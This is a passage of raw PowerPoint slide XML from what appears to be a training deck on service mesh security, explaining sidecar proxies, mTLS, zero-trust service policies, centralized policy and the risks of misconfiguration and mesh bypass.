                </a:solidFill>
              </a:rPr>
              <a:t>From the app’s perspective:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Service A thinks it’s talking to Service B over normal HTTP/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>gRPC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>In reality, A → its sidecar proxy → B’s sidecar proxy → B.</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A357E6B2-2D44-9708-2643-7C94B1627899}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>128</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="345067565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3AAA-C999-A25B-8731-43D7348AB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ED139-CD35-49EE-D4CB-B7A2CD424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3A121-C0A1-5FF4-865E-79BF33A0AC30}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001D35"/>
                </a:solidFill>
              </a:rPr>
              <a:t>A SCP intercepts and manages all network traffic running without modifying the application code itself</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>. It acts as a "helper" or "assistant" for the application, allowing the main service to focus on its core functions while the sidecar takes care of auxiliary tasks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0A0A0A"/>
              </a:solidFill>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>From the app’s perspective:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Service A thinks it’s talking to Service B over normal HTTP/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>gRPC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>In reality, A → its sidecar proxy → B’s sidecar proxy → B.</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49DCCB66-FEC6-FA00-BBC6-6E26E86E0283}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>129</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="79411413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BB51-072E-E15A-AC00-371DA5B49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7D638-7F8F-E868-7B46-DAFD29449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09B01-49B7-B9DF-CAA7-E7A753B38260}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>mTLS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> everywhere</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Calibri"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Every service-to-service call is:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Encrypted in transit.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Authenticated at both ends: each service has a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>strong identity</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> (cert) issued by the mesh’s CA.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Calibri"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>This kills:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Passive sniffing on the network.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Simple impersonation (“I’ll just send a request pretending to be service B”)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Zero trust inside the cluster</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Calibri"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>You can write policies like:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>“Only order-service can talk to payment-service on port 8080.”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>“reporting-service can call user-service GET /users/*, but not POST /users.”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Calibri"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>That means if an attacker compromises one pod, they </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>cannot</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> freely call everything else; lateral movement is constrained.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0A0A0A"/>
              </a:solidFill>
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Centralized policy management</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Calibri"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Security rules live in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>config + policy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, not scattered across codebases.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Calibri"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Example: a strict </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>mTLS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> policy or deny-by-default egress rule applied to an entire namespace.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Deep visibility</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Calibri"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Every call is visible at the mesh layer:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Which services are talking to which?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Which endpoints are rarely used (but exposed)?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Spikes in error rates or latency that might indicate an attack.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{64B50E8A-74B2-8413-60F8-FA0CCCB8F117}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>130</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="368647260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763C0-83BB-E25C-4667-8CC028D96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3210C-6214-93A3-1F2C-F4F02BFCE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F025E-41DF-BA9C-29A2-AAB16D4B49D8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Service mesh configuration is not trivial.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>A false sense of security (“we installed Istio, we’re secure now”) is dangerous.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Any path that bypasses the mesh is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>uncontrolled and unobserved</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="0A0A0A"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>As a senior dev, you need to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>balance</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> strong </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>mTLS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> and rich policy against latency and resource usage.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="0A0A0A"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="0A0A0A"/>
              </a:solidFill>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Service Mesh Security Errors are mostly centered around human error - bypass, and misconfiguration</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="0A0A0A"/>
              </a:solidFill>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="0A0A0A"/>
              </a:solidFill>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Thought experiment</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Imagine an attacker who has shell access inside one pod in your cluster.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Without a mesh:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>They can probably curl every internal service at will.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>With a mesh and strict policies:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>That pod’s service identity only has rights to the small subset of calls it actually needs.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Everything else is denied or logged as suspicious.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A7C26E2B-7880-67A9-DCE5-5F88F4E5E903}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>131</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="164661809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7B501-6589-873B-BAC8-DC4C78649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225C9-53C4-C401-42DB-1D31C1ACA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FA713-283B-79E2-7AAD-7DCD5942BAC9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Depth – security at each layer, such as physical, network, endpoint, application</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Breadth – multiple controls at each layer (e.g. Network – DLP, Firewalls, Segmentation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">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D4F5EC97-9F18-A67A-F655-3C92B5B97595}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
